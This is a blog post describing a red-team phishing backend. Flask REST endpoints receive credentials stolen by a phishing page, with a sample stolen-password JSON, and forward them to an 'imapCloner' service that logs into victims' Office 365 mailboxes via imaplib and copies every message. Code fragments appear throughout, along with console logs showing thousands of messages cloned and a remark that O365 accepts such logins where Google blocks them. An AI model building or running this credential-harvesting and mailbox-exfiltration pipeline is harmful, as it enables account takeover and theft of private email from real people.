---
layout: post
title:  "SIEM for red team - IMAP O365 instant clone via flask REST API"
date:   2019-01-23 21:32:00 +0000
categories: phishing siem redteam imap flask rest api
---
# REST instant clone O365
From the previous post, I've said I'd use the following resources/services for this project:
* CloudFront from AWS
* Instances from digital ocean or AWS.
* Python3 scripts to deal with all rest API's
* ~~OfflineIMAP module for python~~
    * We'll use pure imaplib instead.
* MySQL to store history of traffic and events
* Prelude SIEM - To be reviewed later
* Gophish or FiercePhish

The progresses have been pushed to github but I'll detail here what I've done so far.

## Python3 scripts to deal with all rest API calls
I've created 3 python scripts
* servimap
* imapCloner
* processimap


### servimap
The servimap is the border REST API based in flask. We have two routes defined on the file.

The root:
```python
@app.route('/')
```
and the framework:
```python
@app.route('/test',methods=['POST'])
```
The methods allowed are just POST to post the stolen credentials.
### Route /test
The credentials is stolen, the web page will post json in this format:
```json
{
  "client": "The client vendor",
  "email": "user@email.address",
  "pass": "stolen password"
}
```
Example:
```json
{
  "client": "O365",
  "email": "bzeroedbrain@ret.re",
  "pass": "JustAnE@amPl3Pa$$"
}
```
Depending what client is the program will take a different path.
The path will be called a different rest api running in another server as explained in the previous post on architecture.
```python
content = request.get_json(silent=True)
c=content['client']
if(c=="O365"):
    #call O365
    requests.post("http://localhost:5010/imapO365",json=content)
elif(c=="Google"):
    #call google
    requests.post("http://localhost:5010/imapGoogle",json=content)
elif(c=="Other"):
    #call other, try to guess
    requests.post("http://localhost:5010/imapTry",json=content)
```
The remove server will be the imapCloner
### imapCloner
The imapCloner contains some routes to process the mailbox clone via IMAP.
A problem I found was google marks these connections as suspicious and OAUTH2 is the method that is supported and more secure to connect. But Microsoft Office 365 accepts these connections with no problems.

```python
#IMAP of Office 365 route
#TODO: Support THREADS. Need to return 302 or 403 to the client and continue the process on server side.
@app.route('/imapO365',methods=['POST'])
```
### processimap
This script is is just two basic functions to clone the mailbox using imaplib:
```python
def process_imap_folders(M,dir):
    #iterates the imap folders. we want dem all!
```
```python
def process_mailbox(M,dir):
    #clone copy all e-mail of that dir on mailbox M to a local dir
```
So when the /test is posted with the json, it will post to corresponding client on imapCloner.
The testclient will just receive, at the moment, "OK":
```console
➜  api-imap git:(develop) ✗ python3 testclient.py
OK
➜  api-imap git:(develop) ✗ python3 testclient.py
OK
```
The servimap will just detect this as example:
```console
➜  api-imap git:(develop) ✗ python3 servimap.py
 * Serving Flask app "servimap" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 271-507-179
127.0.0.1 - - [21/Jan/2019 00:14:03] "POST /test HTTP/1.1" 200 -
127.0.0.1 - - [21/Jan/2019 00:15:29] "POST /test HTTP/1.1" 200 -
127.0.0.1 - - [21/Jan/2019 00:18:48] "POST /test HTTP/1.1" 200 -
127.0.0.1 - - [21/Jan/2019 00:43:02] "POST /test HTTP/1.1" 200 -
127.0.0.1 - - [21/Jan/2019 00:48:55] "POST /test HTTP/1.1" 200 -
127.0.0.1 - - [21/Jan/2019 00:50:52] "POST /test HTTP/1.1" 200 -
```
And the cloner will start right away to clone the mailbox:
```console
➜  api-imap git:(develop) ✗ /usr/local/bin/python3 /Users/pushdword/ret.re/siem-rt/api-imap/imapCloner.py
 * Serving Flask app "imapCloner" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://127.0.0.1:5010/ (Press CTRL+C to quit)
 * Restarting with stat
 * Debugger is active!
 * Debugger PIN: 271-507-179
 IMAP O365 TRIGGERED
OK
DATA:
[b'0']
OK
DATA:
[b'0']
OK
DATA:
[b'0']
OK
DATA:
[b'18971']
Writing message b'1'
Writing message b'2'
Writing message b'3'
Writing message b'4'
Writing message b'5'
(...)
```
An office 365 account was used in this test case. We'll need to fine tune this and put perhaps on the cloud :)